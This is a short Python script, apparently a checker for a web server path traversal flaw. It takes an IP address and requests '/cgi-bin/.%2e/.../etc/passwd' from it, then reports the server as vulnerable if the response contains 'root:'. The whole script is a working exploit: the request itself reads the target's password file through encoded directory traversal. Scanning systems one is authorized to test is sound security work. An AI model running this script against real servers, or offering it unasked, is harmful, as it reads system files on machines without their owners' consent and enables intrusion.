import requests
import sys
import ipaddress

IP = str(ipaddress.ip_address(sys.argv[1]))
file_identifier = "root:"
URL = "http://"+IP+"/cgi-bin/.%2e/.%2e/.%2e/.%2e/.%2e/.%2e/.%2e/.%2e/.%2e/etc/passwd\n"


def make_request():
    try:
        r = requests.get(url=URL)
        if r.status_code == 200 and file_identifier not in r.text:
            print("Server %s is not vulnerable" % URL)
        elif r.status_code == 200 and file_identifier in r.text:
            print("Server %s is vulnerable!!!" % URL)
    except Exception as e:
        print(e)


if __name__ == '__main__':
    make_request()
